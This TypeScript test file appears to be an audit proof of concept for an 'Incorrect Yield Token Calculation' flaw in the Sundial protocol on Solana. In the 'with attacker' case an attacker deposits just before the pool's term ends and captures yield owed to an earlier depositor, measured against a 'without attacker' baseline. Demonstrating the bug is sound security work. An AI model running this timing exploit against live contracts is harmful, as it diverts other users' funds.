import { PublicKey, Transaction } from '@solana/web3.js';
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  Token,
  TOKEN_PROGRAM_ID,
  u64,
} from '@solana/spl-token';
import { DEFAULT_RESERVE_CONFIG, PORT_LENDING } from './constants';
import {
  createAccountRentExempt,
  createMintAndVault,
  getTokenAccount,
  sleep,
} from '@project-serum/common';
import { createDefaultReserve, createLendingMarket } from './utils';
import { INITIAL_MINT_AMOUNT, makeSDK } from './workspace';
import {
  ReserveParser,
  ParsedAccount,
  ReserveData,
  ReserveInfo,
  initObligationInstruction,
  refreshObligationInstruction,
  PORT_PROFILE_DATA_SIZE,
} from '@port.finance/port-sdk';
import { expectTX } from '@saberhq/chai-solana';

describe('Incorrect Yield Token Calculation', () => {
  const sdk = makeSDK();
  const provider = sdk.provider;
  const sundialWrapper = sdk.sundialWrapper;

  const depositAmount = new u64(400_000_000_000);
  const borrowAmount = new u64(300_000_000_000);
  const borrowRate = 255;
  const lendingFee = 0;
  const victimAmount = new u64(100_000_000_000);
  const attackerAmount = new u64(100_000_000_000);

  let lendingMarket: PublicKey;
  let parsedReserve: ParsedAccount<ReserveData>;
  let liquidityVault: PublicKey;
  let yieldVault: PublicKey;
  let principleVault: PublicKey;

  beforeEach('init', async () => {
    lendingMarket = (await createLendingMarket(provider)).publicKey;
    let liquidityMint: PublicKey;
    [liquidityMint, liquidityVault] = await createMintAndVault(
      provider,
      INITIAL_MINT_AMOUNT,
    );
    const reserveState = await createDefaultReserve(
      provider,
      depositAmount,
      liquidityVault,
      lendingMarket,
      {
        ...DEFAULT_RESERVE_CONFIG,
        minBorrowRate: borrowRate,
        optimalBorrowRate: borrowRate,
        maxBorrowRate: borrowRate,
      },
    );
    const reserveInfo = ReserveInfo.fromRaw({
        pubkey: reserveState.address,
        account: await provider.connection.getAccountInfo(reserveState.address),
    });
    const obligation = (await createAccountRentExempt(
      provider,
      PORT_LENDING,
      PORT_PROFILE_DATA_SIZE,
    )).publicKey;

    const tx = new Transaction();
    tx.add(initObligationInstruction(
      obligation,
      lendingMarket,
      provider.wallet.publicKey,
    ));
    tx.add(...await reserveInfo.depositObligationCollateral({
      amount: depositAmount,
      userCollateralWallet: reserveState.useCollateralAccount,
      obligation: obligation,
      obligationOwner: provider.wallet.publicKey,
      userTransferAuthority: provider.wallet.publicKey,
    }));
    tx.add(refreshObligationInstruction(
      obligation,
      [reserveState.address],
      [],
    ));
    tx.add(...await reserveInfo.borrowObligationLiquidity({
      amount: borrowAmount,
      userWallet: liquidityVault,
      obligation: obligation,
      owner: provider.wallet.publicKey,
    }));
    await provider.send(tx);

    const sundialMarket = (await sdk.createSundialMarket()).publicKey;
    parsedReserve = ReserveParser({
      pubkey: reserveState.address,
      account: await provider.connection.getAccountInfo(reserveState.address),
    });

    const createTx = await sundialWrapper.createSundial({
      sundialName: 'USDC',
      owner: provider.wallet.publicKey,
      durationInSeconds: new u64(15),
      liquidityMint: liquidityMint,
      oracle: PublicKey.default,
      sundialMarket: sundialMarket,
      reserve: parsedReserve,
      lendingFeeInBips: lendingFee,
    });
    await expectTX(createTx, 'Create sundial').to.be.fulfilled;
    await sundialWrapper.reloadData();

    const principleMint = (await sundialWrapper.getPrincipleMintAndBump())[0];
    const yieldMint = (await sundialWrapper.getYieldMintAndBump())[0];
    principleVault = await Token.getAssociatedTokenAddress(
      ASSOCIATED_TOKEN_PROGRAM_ID,
      TOKEN_PROGRAM_ID,
      principleMint,
      provider.wallet.publicKey,
    );
    yieldVault = await Token.getAssociatedTokenAddress(
      ASSOCIATED_TOKEN_PROGRAM_ID,
      TOKEN_PROGRAM_ID,
      yieldMint,
      provider.wallet.publicKey,
    );
  });

  it('with attacker', async () => {
    const victimDepositTx = await sundialWrapper.mintPrincipleAndYieldTokens({
      amount: victimAmount,
      userLiquidityWallet: liquidityVault,
      reserve: parsedReserve,
    });
    await expectTX(
      victimDepositTx,
      'victim mint principle and yield',
    ).to.be.fulfilled;

    let principleWallet = await getTokenAccount(provider, principleVault);
    let yieldWallet = await getTokenAccount(provider, yieldVault);
    console.log(
      'victim:',
      victimAmount.toString(),
      'L ->',
      principleWallet.amount.toString(),
      'P +',
      yieldWallet.amount.toString(),
      'Y',
    );

    await sleep(13500);
    
    // This should ideally be executed the slot before the sundial ends.
    // Due to timing differences in the test script, this does not always happen
    // and the subsequent redeem instruction is delayed to compensate.
    const attackerDepositTx = await sundialWrapper.mintPrincipleAndYieldTokens({
      amount: attackerAmount,
      userLiquidityWallet: liquidityVault,
      reserve: parsedReserve,
    });
    await expectTX(
      attackerDepositTx,
      'attacker mint principle and yield',
    ).to.be.fulfilled;

    // This sometimes causes the redeem to be executed late, which means that
    // more total yield may be gained in the test case, but this is not
    // reflective of real world use.
    await sleep(1000);

    const redeemTx = await sundialWrapper.redeemPortLp({
      lendingMarket: lendingMarket,
      reserve: parsedReserve,
    });
    await expectTX(redeemTx, 'redeem port lp').to.be.fulfilled;

    let oldLiquidityWallet = await getTokenAccount(provider, liquidityVault);

    const victimRedeemPrincipleTx = await sundialWrapper.redeemPrincipleTokens({
      amount: principleWallet.amount,
      userLiquidityWallet: liquidityVault,
    });
    await expectTX(
      victimRedeemPrincipleTx,
      'victim redeem principle',
    ).to.be.fulfilled;

    let liquidityWallet = await getTokenAccount(provider, liquidityVault);
    let net = liquidityWallet.amount.sub(oldLiquidityWallet.amount);
    oldLiquidityWallet = liquidityWallet;
    console.log(
      'victim:',
      principleWallet.amount.toString(),
      'P ->',
      net.toString(),
      'L',
    );

    const victimRedeemYieldTx = await sundialWrapper.redeemYieldTokens({
      amount: yieldWallet.amount,
      userLiquidityWallet: liquidityVault,
    });
    await expectTX(victimRedeemYieldTx, 'victim redeem yield').to.be.fulfilled;

    liquidityWallet = await getTokenAccount(provider, liquidityVault);
    net = liquidityWallet.amount.sub(oldLiquidityWallet.amount);
    oldLiquidityWallet = liquidityWallet;
    console.log(
      'victim:',
      yieldWallet.amount.toString(),
      'Y ->',
      net.toString(),
      'L',
    );

    principleWallet = await getTokenAccount(provider, principleVault);
    yieldWallet = await getTokenAccount(provider, yieldVault);
    console.log(
      'attacker:',
      attackerAmount.toString(),
      'L ->',
      principleWallet.amount.toString(),
      'P +',
      yieldWallet.amount.toString(),
      'Y',
    );

    const attackerRedeemPrincipleTx =
      await sundialWrapper.redeemPrincipleTokens({
        amount: principleWallet.amount,
        userLiquidityWallet: liquidityVault,
      });
    await expectTX(
      attackerRedeemPrincipleTx,
      'attacker redeem principle',
    ).to.be.fulfilled;

    liquidityWallet = await getTokenAccount(provider, liquidityVault);
    net = liquidityWallet.amount.sub(oldLiquidityWallet.amount);
    oldLiquidityWallet = liquidityWallet;
    console.log(
      'attacker:',
      principleWallet.amount.toString(),
      'P ->',
      net.toString(),
      'L',
    );

    const attackerRedeemYieldTx = await sundialWrapper.redeemYieldTokens({
      amount: yieldWallet.amount,
      userLiquidityWallet: liquidityVault,
    });
    await expectTX(
      attackerRedeemYieldTx,
      'attacker redeem yield',
    ).to.be.fulfilled;

    liquidityWallet = await getTokenAccount(provider, liquidityVault);
    net = liquidityWallet.amount.sub(oldLiquidityWallet.amount);
    console.log(
      'attacker:',
      yieldWallet.amount.toString(),
      'Y ->',
      net.toString(),
      'L',
    );
  });

  it('without attacker', async () => {
    const victimDepositTx = await sundialWrapper.mintPrincipleAndYieldTokens({
      amount: victimAmount,
      userLiquidityWallet: liquidityVault,
      reserve: parsedReserve,
    });
    await expectTX(
      victimDepositTx,
      'victim mint principle and yield',
    ).to.be.fulfilled;

    let principleWallet = await getTokenAccount(provider, principleVault);
    let yieldWallet = await getTokenAccount(provider, yieldVault);
    console.log(
      'victim:',
      victimAmount.toString(),
      'L ->',
      principleWallet.amount.toString(),
      'P +',
      yieldWallet.amount.toString(),
      'Y',
    );

    await sleep(15000);

    const redeemTx = await sundialWrapper.redeemPortLp({
      lendingMarket: lendingMarket,
      reserve: parsedReserve,
    });
    await expectTX(redeemTx, 'redeem port lp').to.be.fulfilled;

    let oldLiquidityWallet = await getTokenAccount(provider, liquidityVault);

    const victimRedeemPrincipleTx = await sundialWrapper.redeemPrincipleTokens({
      amount: principleWallet.amount,
      userLiquidityWallet: liquidityVault,
    });
    await expectTX(
      victimRedeemPrincipleTx,
      'victim redeem principle',
    ).to.be.fulfilled;

    let liquidityWallet = await getTokenAccount(provider, liquidityVault);
    let net = liquidityWallet.amount.sub(oldLiquidityWallet.amount);
    oldLiquidityWallet = liquidityWallet;
    console.log(
      'victim:',
      principleWallet.amount.toString(),
      'P ->',
      net.toString(),
      'L',
    );

    const victimRedeemYieldTx = await sundialWrapper.redeemYieldTokens({
      amount: yieldWallet.amount,
      userLiquidityWallet: liquidityVault,
    });
    await expectTX(victimRedeemYieldTx, 'victim redeem yield').to.be.fulfilled;

    liquidityWallet = await getTokenAccount(provider, liquidityVault);
    net = liquidityWallet.amount.sub(oldLiquidityWallet.amount);
    console.log(
      'victim:',
      yieldWallet.amount.toString(),
      'Y ->',
      net.toString(),
      'L',
    );
  });
});
